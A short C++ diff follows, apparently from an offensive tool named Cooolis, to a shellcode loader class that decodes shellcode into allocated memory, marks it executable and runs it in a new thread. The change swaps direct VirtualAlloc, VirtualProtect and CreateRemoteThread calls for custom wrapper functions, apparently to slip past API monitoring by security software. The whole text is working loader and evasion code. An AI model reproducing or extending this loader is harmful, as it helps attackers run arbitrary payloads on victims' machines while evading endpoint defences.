@@ -42,7 +42,7 @@ VOID CCooolisShellcode::ConvertShellcodeByCHAR(DWORD dwSize)
 	std::string sCodeString  = "";
 	
 	// this->Shellcode = new BYTE[dwShellcodeSize];
-	this->Shellcode = (PBYTE)VirtualAlloc(NULL, dwShellcodeSize, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
+	this->Shellcode = (PBYTE)CooolisVirtualAlloc(NULL, dwShellcodeSize, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
 
 	for (INT x = 0, y = 1, z = 0; x < dwSize; x++)
 	{
@@ -63,8 +63,8 @@ VOID CCooolisShellcode::ConvertShellcodeByCHAR(DWORD dwSize)
 VOID CCooolisShellcode::CreateThreadRun()
 {
 	DWORD dwOldProtect = NULL;
-	VirtualProtect(this->Shellcode, this->dwShellcodeSize, PAGE_EXECUTE, &dwOldProtect);
-	HANDLE hThread = CreateRemoteThread(GetCurrentProcess(), NULL, NULL, (LPTHREAD_START_ROUTINE)this->Shellcode, NULL, NULL, NULL);
+	CooolisVirtualProtect(this->Shellcode, this->dwShellcodeSize, PAGE_EXECUTE, &dwOldProtect);
+	HANDLE hThread = CooolisCreateRemoteThread(GetCurrentProcess(), NULL, NULL, (LPTHREAD_START_ROUTINE)this->Shellcode, NULL, NULL, NULL);
 	WaitForSingleObject(hThread, INFINITE);
 	return VOID();
 }
